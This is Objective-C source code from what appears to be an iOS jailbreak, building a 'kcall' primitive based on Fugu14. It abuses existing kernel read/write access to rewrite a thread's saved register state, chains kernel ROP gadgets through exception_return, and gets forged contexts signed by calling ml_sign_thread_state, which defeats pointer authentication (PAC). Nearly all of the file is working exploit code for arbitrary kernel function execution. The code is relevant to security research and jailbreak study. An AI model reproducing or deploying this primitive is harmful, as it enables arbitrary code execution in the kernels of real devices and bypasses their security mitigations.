#import "kcall.h"

#import <stdint.h>
#import <stdbool.h>
#import <mach/mach.h>
#import <mach-o/dyld.h>
#import <libfilecom/FCHandler.h>
#import "pplrw.h"
#import "util.h"
#import "jailbreakd.h"
#import "launchd.h"
#import "boot_info.h"
#import "log.h"

typedef struct {
	bool inited;
	thread_t gExploitThread;
	uint64_t gScratchMemKern;
	volatile uint64_t *gScratchMemMapped;
	arm_thread_state64_t gExploitThreadState;
	uint64_t gSpecialMemRegion;
	uint64_t gIntStack;
	uint64_t gOrigIntStack;
	uint64_t gReturnContext;
	uint64_t gACTPtr;
	uint64_t gACTVal;
	uint64_t gCPUData;
} exploitThreadInfo;

typedef struct {
	thread_t thread;
	uint64_t threadPtr;
	uint64_t actContext;
	kRegisterState signedState;
	uint64_t kernelStack;
	kRegisterState *mappedState;
	uint64_t scratchMemory;
	uint64_t *scratchMemoryMapped;
} Fugu14KcallThread;

static void* gThreadMapContext;
static Fugu14KcallThread gFugu14KcallThread;
KcallStatus gKCallStatus = kKcallStatusNotInitialized;

#define MEMORY_BARRIER asm volatile("dmb sy");

uint64_t gUserReturnThreadContext = 0;
volatile uint64_t gUserReturnDidHappen = 0;
static NSLock *gKcallLock;

uint64_t GetThreadID(thread_t port) {

    thread_identifier_info_data_t info;
    mach_msg_type_number_t info_count=THREAD_IDENTIFIER_INFO_COUNT;
    kern_return_t kr=thread_info(port,
                                 THREAD_IDENTIFIER_INFO,
                                 (thread_info_t)&info,
                                 &info_count);
    if(kr!=KERN_SUCCESS) {
        /* you can get a description of the error by calling
         * mach_error_string(kr)
         */
        return 0;
    } else {
        return info.thread_id;
    }
}

uint64_t getUserReturnThreadContext(void) {
	if (gUserReturnThreadContext != 0) {
		return gUserReturnThreadContext;
	}
	
	arm_thread_state64_t state;
	bzero(&state, sizeof(state));
	
	arm_thread_state64_set_pc_fptr(state, (void*)pac_loop);
	for (size_t i = 0; i < 29; i++) {
		state.__x[i] = 0xDEADBEEF00ULL | i;
	}
	
	//sleep(1);

	thread_t chThread = 0;
	kern_return_t kr = thread_create_running(mach_task_self_, ARM_THREAD_STATE64, (thread_state_t)&state, ARM_THREAD_STATE64_COUNT, &chThread);
	if (kr != KERN_SUCCESS) {
		JBLogError("[-] getUserReturnThreadContext: Failed to create return thread!");
		return 0;
	}
	uint64_t returnThreadPtr = task_get_first_thread(self_task());
	if (returnThreadPtr == 0) {
		JBLogError("[-] getUserReturnThreadContext: Failed to find return thread!");
		return 0;
	}
	
	thread_suspend(chThread);

	JBLogDebug("returnThread tid=%d, %d", kread64(returnThreadPtr+0x550), GetThreadID(chThread));
	
	uint64_t returnThreadACTContext = thread_get_act_context(returnThreadPtr);
	if (returnThreadACTContext == 0) {
		JBLogError("[-] getUserReturnThreadContext: Return thread has no ACT_CONTEXT?!");
		return 0;
	}
	
	JBLogDebug("gUserReturnThreadContext=%llx", gUserReturnThreadContext);
	gUserReturnThreadContext = returnThreadACTContext;


	arm_thread_state64_t old_state;
	mach_msg_type_number_t old_stateCnt = ARM_THREAD_STATE64_COUNT;
	JBLogDebug("getstate=%d", thread_get_state(chThread, ARM_THREAD_STATE64, (thread_state_t)&old_state, &old_stateCnt));
	JBLogDebug("armstate pc=%llx lr=%llx sp=%llx", old_state.__opaque_pc, old_state.__opaque_lr, old_state.__opaque_sp);
	for(int i=0; i<29; i++) {
		JBLogDebug("armstate.x[%d]=%llx",i,old_state.__x[i]);
	}

	JBLogDebug("userThread pc=%llx lr=%llx sp=%llx",
	kread64(returnThreadACTContext + offsetof(kRegisterState, pc)),
	kread64(returnThreadACTContext + offsetof(kRegisterState, lr)),
	kread64(returnThreadACTContext + offsetof(kRegisterState, sp)) );
	for(int i=0; i<29; i++) {
		uint64_t value = kread64(returnThreadACTContext + offsetof(kRegisterState, x[0]) + i*8);
		JBLogDebug("userThread.x[%d]=%llx",i,value);
	}
	
	return returnThreadACTContext;
}

// This prepares the thread state for an ordinary Fugu14 like kcall
// It is possible to bypass this by just calling kcall_with_raw_thread_state with any thread state you want
void Fugu14Kcall_prepareThreadState(Fugu14KcallThread *callThread, KcallThreadState *threadState)
{
	// Set pc to the function, lr to str x0, [x19]; ldr x??, [x20]; gadget
	threadState->lr = bootInfo_getSlidUInt64(@"str_x0_x19_ldr_x20");

	// New state
	// x19 -> Where to store return value
	threadState->x[19] = callThread->scratchMemory;
	
	// x20 -> NULL (to force data abort)
	threadState->x[20] = 0;
	
	// x22 -> exceptionReturn
	threadState->x[22] = bootInfo_getSlidUInt64(@"exception_return");
	
	// Exception return expects a signed state in x21
	threadState->x[21] = getUserReturnThreadContext(); // Guaranteed to not fail at this point
	
	// Also need to set sp
	threadState->sp = callThread->kernelStack;
}

uint64_t Fugu14Kcall_withThreadState(Fugu14KcallThread *callThread, KcallThreadState *threadState)
{
	ksync_start();

	//[gKcallLock lock];
	JBLogDebug("kcall %d, lr=%llx sp=%llx lr=%llx sp=%llx", gUserReturnDidHappen, threadState->lr, threadState->sp, 
	callThread->signedState.lr, callThread->signedState.sp);

	// Restore signed state first
	kwritebuf(callThread->actContext, &callThread->signedState, sizeof(kRegisterState));
	
	// Set all registers based on passed threadState
	kwrite64(callThread->actContext + offsetof(kRegisterState, x[1]), threadState->pc); // x1 -> new pc
	kwrite64(callThread->actContext + offsetof(kRegisterState, x[3]), threadState->lr); // x3 -> new lr
	for (int i = 0; i < 29; i++) {
		callThread->mappedState->x[i] = threadState->x[i];
	}
	callThread->mappedState->sp = threadState->sp;

	// Reset flag
	gUserReturnDidHappen = 0;
	
	// Sync all changes
	// (Probably not required)
	MEMORY_BARRIER
	
	// Run the thread
	kern_return_t kr1=thread_resume(callThread->thread);
	
	// Wait for flag to be set
	while (!gUserReturnDidHappen) ;
	
	// Stop thread
	kern_return_t kr2=thread_suspend(callThread->thread);
	kern_return_t kr3=thread_abort(callThread->thread);
	
	// Sync all changes
	// (Probably not required)
	MEMORY_BARRIER

	// Copy return value
	uint64_t retval = callThread->scratchMemoryMapped[0];

	//[gKcallLock unlock];

	ksync_finish();
	
	JBLogDebug("kcall kr=%d,%d,%d", kr1,kr2,kr3);
	return retval;
}

uint64_t Fugu14Kcall_withArguments(Fugu14KcallThread *callThread, uint64_t func, uint64_t argc, const uint64_t *argv)
{
	assert (argc <= 19);

	[gKcallLock lock];

	KcallThreadState threadState = { 0 };
		
	for (size_t i = 0; i < 29; i++) {
		threadState.x[i] = 0xDEADBEEF00ULL | i;
	}

	Fugu14Kcall_prepareThreadState(&gFugu14KcallThread, &threadState);
	threadState.pc = func;

	uint64_t regArgc = 0;
	uint64_t stackArgc = 0;
	if (argc >= 8) {
		regArgc = 8;
		stackArgc = argc - 8;
	}
	else {
		regArgc = argc;
	}

	// Set register args (x0 - x8)
	for (uint64_t i = 0; i < regArgc; i++)
	{
		threadState.x[i] = argv[i];
	}

	// Set stack args
	for (uint64_t i = 0; i < stackArgc; i++)
	{
		uint64_t argKaddr = (threadState.sp + i * 0x8);
		kwrite64(argKaddr, argv[8+i]);
	}

	uint64_t retVal = Fugu14Kcall_withThreadState(callThread, &threadState);

	[gKcallLock unlock];

	return retVal;
}

uint64_t kcall(uint64_t func, uint64_t argc, const uint64_t *argv)
{
	if (gKCallStatus != kKcallStatusFinalized) {
		if (gIsJailbreakd) return 0;
		return jbdKcall(func, argc, argv);
	}
	return Fugu14Kcall_withArguments(&gFugu14KcallThread, func, argc, argv);
}

uint64_t kcall8(uint64_t func, uint64_t a1, uint64_t a2, uint64_t a3, uint64_t a4, uint64_t a5, uint64_t a6, uint64_t a7, uint64_t a8)
{
	uint64_t argv[8] = {a1, a2, a3, a4, a5, a6, a7, a8};
	return kcall(func, 8, argv);
}

uint64_t kcall_with_raw_thread_state(KcallThreadState threadState)
{
	if (gKCallStatus != kKcallStatusFinalized) {
		if (gIsJailbreakd) return 0;
		return jbdKcallThreadState(&threadState, true);
	}

	[gKcallLock lock];
	uint64_t retVal = Fugu14Kcall_withThreadState(&gFugu14KcallThread, &threadState);
	[gKcallLock unlock];
	return retVal;
}

uint64_t kcall_with_thread_state(KcallThreadState threadState)
{
	if (gKCallStatus != kKcallStatusFinalized) {
		if (gIsJailbreakd) return 0;
		return jbdKcallThreadState(&threadState, false);
	}

	[gKcallLock lock];
	Fugu14Kcall_prepareThreadState(&gFugu14KcallThread, &threadState);
	uint64_t retVal = Fugu14Kcall_withThreadState(&gFugu14KcallThread, &threadState);
	[gKcallLock unlock];
	return retVal;
}

uint64_t initPACPrimitives(uint64_t kernelAllocation)
{
	if (gKCallStatus != kKcallStatusNotInitialized || kernelAllocation == 0) {
		return 0;
	}

	gKcallLock = [[NSLock alloc] init];

	//sleep(1);

	thread_t thread = 0;
	kern_return_t kr = thread_create(mach_task_self_, &thread);
	if (kr != KERN_SUCCESS) {
		JBLogError("[-] setupFugu14Kcall: thread_create failed!");
		return false;
	}
	// Find the thread
	uint64_t threadPtr = task_get_first_thread(self_task());
	if (threadPtr == 0) {
		JBLogError("[-] setupFugu14Kcall: Failed to find thread!");
		return false;
	}

	JBLogDebug("thread=%llx tid=%d, %d", threadPtr, kread64(threadPtr+0x550), GetThreadID(thread));
	JBLogDebug("thread context %llx %llx", kread64(threadPtr+0xa8), kread64(threadPtr+0xa8+8));

	// Get it's state pointer
	uint64_t actContext = thread_get_act_context(threadPtr);
	if (threadPtr == 0) {
		JBLogError("[-] setupFugu14Kcall: Failed to get thread ACT_CONTEXT!");
		return false;
	}

	for (size_t i = 0; i < 29; i++) {
		kwrite64(actContext + offsetof(kRegisterState, x[0]) + i*8, 0xEEADBEEF00ULL | i);
	}
	
	JBLogDebug("actContext=%llx pc=%llx lr=%llx sp=%llx jophash=%llx", actContext,
	kread64(actContext + offsetof(kRegisterState, pc)),
	kread64(actContext + offsetof(kRegisterState, lr)),
	kread64(actContext + offsetof(kRegisterState, sp)),
	kread64(actContext + 0x128) );
	for(int i=0; i<29; i++) {
		uint64_t value = kread64(actContext + offsetof(kRegisterState, x[0]) + i*8);
		JBLogDebug("actContext.x[%d]=%llx",i,value);
	}
	arm_thread_state64_t old_state;
	mach_msg_type_number_t old_stateCnt = ARM_THREAD_STATE64_COUNT;
	JBLogDebug("getstate=%d", thread_get_state(thread, ARM_THREAD_STATE64, (thread_state_t)&old_state, &old_stateCnt));
	JBLogDebug("armstate pc=%llx lr=%llx sp=%llx", old_state.__opaque_pc, old_state.__opaque_lr, old_state.__opaque_sp);
	for(int i=0; i<29; i++) {
		JBLogDebug("armstate.x[%d]=%llx",i,old_state.__x[i]);
	}

	// stack is at middle of allocation
	uint64_t stack = kernelAllocation + 0x8000ULL;

	// Write context

	uint64_t str_x8_x9_gadget = bootInfo_getSlidUInt64(@"str_x8_x9_gadget"); //str x8,[x9]  ret
	uint64_t exception_return_after_check = bootInfo_getSlidUInt64(@"exception_return_after_check");
	uint64_t brX22 = bootInfo_getSlidUInt64(@"br_x22_gadget");

	// Write register values
	kwrite64(actContext + offsetof(kRegisterState, pc),    str_x8_x9_gadget);
	kwrite32(actContext + offsetof(kRegisterState, cpsr),  get_cspr_kern_intr_dis());
	kwrite64(actContext + offsetof(kRegisterState, lr),    exception_return_after_check);
	kwrite64(actContext + offsetof(kRegisterState, x[16]), 0);
	kwrite64(actContext + offsetof(kRegisterState, x[17]), brX22);

	// Use str x8, [x9] gadget to set TH_KSTACKPTR
	kwrite64(actContext + offsetof(kRegisterState, x[8]), stack + 0x10ULL);
	kwrite64(actContext + offsetof(kRegisterState, x[9]), threadPtr + bootInfo_getUInt64(@"TH_KSTACKPTR"));

	// SP and x0 should both point to the new CPU state
	kwrite64(actContext + offsetof(kRegisterState, sp),   stack);
	kwrite64(actContext + offsetof(kRegisterState, x[0]), stack);

	// x2 -> new cpsr
	// Include in signed state since it is rarely changed
	kwrite64(actContext + offsetof(kRegisterState, x[2]), get_cspr_kern_intr_en());

	JBLogDebug("actContext pc=%llx lr=%llx sp=%llx jophash=%llx", 
	kread64(actContext + offsetof(kRegisterState, pc)),
	kread64(actContext + offsetof(kRegisterState, lr)),
	kread64(actContext + offsetof(kRegisterState, sp)),
	kread64(actContext + 0x128) );
	for(int i=0; i<29; i++) {
		uint64_t value = kread64(actContext + offsetof(kRegisterState, x[0]) + i*8);
		JBLogDebug("actContext.x[%d]=%llx",i,value);
	}

	kRegisterState *mappedState = kvtouaddr(stack);

	gFugu14KcallThread.thread              = thread;
	gFugu14KcallThread.threadPtr           = threadPtr;
	gFugu14KcallThread.kernelStack         = stack;
	gFugu14KcallThread.scratchMemory       = stack + 0x7000ULL;
	gFugu14KcallThread.mappedState         = mappedState;
	gFugu14KcallThread.actContext          = actContext;
	gFugu14KcallThread.scratchMemoryMapped = kvtouaddr(kernelAllocation + 0xF000ULL);

	gKCallStatus = kKcallStatusPrepared;

	return actContext;
}

void finalizePACPrimitives(void)
{
	if (gKCallStatus != kKcallStatusPrepared) {
		return;
	}

	// When this is called, we except actContext to be signed,
	//  so we can continue to finish setting up the kcall thread

	uint64_t actContext = gFugu14KcallThread.actContext;
	thread_t thread = gFugu14KcallThread.thread;
	kRegisterState *mappedState = gFugu14KcallThread.mappedState;

	uint64_t threadPtr = gFugu14KcallThread.threadPtr;
	JBLogDebug("thread context %llx %llx", kread64(threadPtr+0xa8), kread64(threadPtr+0xa8+8));

	// Create a copy of signed state
	kreadbuf(actContext, &gFugu14KcallThread.signedState, sizeof(kRegisterState));

	JBLogDebug("signedState pc=%llx lr=%llx sp=%llx jophash=%llx", 
	gFugu14KcallThread.signedState.pc, 
	gFugu14KcallThread.signedState.lr, 
	gFugu14KcallThread.signedState.sp,
	*(uint64_t*)((uint64_t)&gFugu14KcallThread.signedState + 0x128) );
	for(int i=0; i<29; i++) {
		uint64_t value = gFugu14KcallThread.signedState.x[i];
		JBLogDebug("signedState.x[%d]=%llx",i,value);
	}

	// Save signed state for later generations
	NSData *signedStateData = [NSData dataWithBytes:&gFugu14KcallThread.signedState length:sizeof(kRegisterState)];

	// Set a custom recovery handler
	uint64_t hw_lck_ticket_reserve_orig_allow_invalid = bootInfo_getSlidUInt64(@"hw_lck_ticket_reserve_orig_allow_invalid") + 4;
	
	// x1 -> new pc
	// x3 -> new lr
	kwrite64(actContext + offsetof(kRegisterState, x[1]), hw_lck_ticket_reserve_orig_allow_invalid);
	// We don't need lr here

	// New state
	// Force a data abort in hw_lck_ticket_reserve_orig_allow_invalid
	mappedState->x[0] = 0;
	
	// Fault handler is br x22 -> set x22
	mappedState->x[22] = bootInfo_getSlidUInt64(@"exception_return");
	
	// Exception return expects a signed state in x21
	mappedState->x[21] = getUserReturnThreadContext(); // Guaranteed to not fail at this point
	
	// Also need to set sp
	mappedState->sp = gFugu14KcallThread.kernelStack;
	
	// Reset flag
	gUserReturnDidHappen = 0;

	// Sync all changes
	// (Probably not required)
	MEMORY_BARRIER

	JBLogDebug("mappedState pc=%llx lr=%llx sp=%llx", mappedState->pc, mappedState->lr, mappedState->sp);
	for(int i=0; i<29; i++) {
		uint64_t value = mappedState->x[i];
		JBLogDebug("mappedState.x[%d]=%llx",i,value);
	}
	arm_thread_state64_t old_state;
	mach_msg_type_number_t old_stateCnt = ARM_THREAD_STATE64_COUNT;
	JBLogDebug("getstate=%d, %d", thread_get_state(thread, ARM_THREAD_STATE64, (thread_state_t)&old_state, &old_stateCnt), old_stateCnt);
	JBLogDebug("armstate pc=%llx lr=%llx sp=%llx", old_state.__opaque_pc, old_state.__opaque_lr, old_state.__opaque_sp);
	for(int i=0; i<29; i++) {
		JBLogDebug("armstate.x[%d]=%llx",i,old_state.__x[i]);
	}
	
	// Run the thread
	thread_resume(thread);

	JBLogDebug("thread resumed");
	
	// Wait for flag to be set
	while (!gUserReturnDidHappen) ;

	JBLogDebug("thread return to user");
	
	// Stop thread
	thread_suspend(thread);
	thread_abort(thread);

	sleep(1);
	gUserReturnDidHappen = 0;
	
	JBLogDebug("thread stoped");

	// Done!
	// Thread's fault handler is now set to the br x22 gadget
	gKCallStatus = kKcallStatusFinalized;
}

NSString *getExecutablePath(void)
{
	uint32_t bufsize = 0;
	_NSGetExecutablePath(NULL, &bufsize);
	char *executablePath = malloc(bufsize);
	_NSGetExecutablePath(&executablePath[0], &bufsize);
	NSString* nsExecutablePath = [NSString stringWithUTF8String:executablePath];
	free(executablePath);
	return nsExecutablePath;
}

int signState(uint64_t actContext)
{
	kRegisterState state;
	kreadbuf(actContext, &state, sizeof(state));

	uint64_t signThreadStateFunc = bootInfo_getSlidUInt64(@"ml_sign_thread_state");
	kcall8(signThreadStateFunc, actContext, state.pc, state.cpsr, state.lr, state.x[16], state.x[17], 0, 0);
	return 0;
}

// jailbreakd -> launchd (using XPC)
int signStateOverJailbreakd(uint64_t actContext)
{
	// kcall automatically goes to jbdKcall when this process does not have the primitive
	// so we can just call it here and except it to go through jbd
	return signState(actContext);
}

// launchd -> jailbreakd / boomerang (using XPC)
int signStateOverLaunchd(uint64_t actContext)
{
	xpc_object_t msg = xpc_dictionary_create_empty();
	xpc_dictionary_set_bool(msg, "jailbreak", true);
	xpc_dictionary_set_uint64(msg, "id", LAUNCHD_JB_MSG_ID_SIGN_STATE);
	xpc_dictionary_set_uint64(msg, "actContext", actContext);

	xpc_object_t reply = launchd_xpc_send_message(msg);
	return xpc_dictionary_get_int64(reply, "error");
}

// boomerang <-> launchd (using libfilecom)
int signStateLibFileCom(uint64_t actContext, NSString *from, NSString *to)
{
	NSString *fromPath = [NSString stringWithFormat:jbrootPath(@"/var/.communication/%@_to_%@"), from, to];
	NSString *toPath = [NSString stringWithFormat:jbrootPath(@"/var/.communication/%@_to_%@"), to, from];
	dispatch_semaphore_t sema = dispatch_semaphore_create(0);
	FCHandler *handler = [[FCHandler alloc] initWithReceiveFilePath:fromPath sendFilePath:toPath];
	handler.receiveHandler = ^(NSDictionary *message) {
		NSString *identifier = message[@"id"];
		if (identifier) {
			if ([identifier isEqualToString:@"signedThreadState"])
			{
				dispatch_semaphore_signal(sema);
			}
		}
	};
	[handler sendMessage:@{ @"id" : @"signThreadState", @"actContext" : @(actContext) }];
	dispatch_semaphore_wait(sema, DISPATCH_TIME_FOREVER);

	return 0;
}

int recoverPACPrimitives()
{
	NSString *processName = getExecutablePath().lastPathComponent;

	// Before we can recover PAC primitives, we need to have PPLRW primitives
	if (gPPLRWStatus != kPPLRWStatusInitialized) return -1;

	// These are the only 3 processes that ever have kcall primitives
	// All other processes can access kcall over XPC to jailbreakd
	NSArray *allowedProcesses = @[@"jailbreakd", @"launchd", @"boomerang"];  
	if (![allowedProcesses containsObject:processName]) return -2;

	// Get pre made kernel allocation from boot info (set in oobPCI main.c during initial jailbreak)
	uint64_t kernelAllocation = bootInfo_getUInt64([NSString stringWithFormat:@"%@_pac_allocation", processName]);

	// Get context to sign
	uint64_t actContextKptr = initPACPrimitives(kernelAllocation);
	int signStatus = 0;

	// Sign context using suitable method based on process and system state
	if ([processName isEqualToString:@"jailbreakd"]) {
		signStatus = signStateOverLaunchd(actContextKptr);
	}
	else if ([processName isEqualToString:@"boomerang"]) {
		signStatus = signStateLibFileCom(actContextKptr, @"launchd", @"boomerang");
	}
	else if ([processName isEqualToString:@"launchd"])
	{
		bool environmentInitialized = (bool)bootInfo_getUInt64(@"environmentInitialized");
	
		// When launchd was already initialized once, we want to get primitives from boomerang
		// (As we are coming from a userspace reboot)
		if (environmentInitialized) {
			signStatus = signStateLibFileCom(actContextKptr, @"boomerang", @"launchd");
		}
		// Otherwise we want to get them from jailbreakd,
		// (As we are coming from a fresh jailbreak)
		else {
			signStatus = signStateOverJailbreakd(actContextKptr);
		}
	}

	// Signing failed, abort
	if (signStatus != 0) return -3;

	// If everything went well, finalize and return success
	finalizePACPrimitives();
	return 0;
}
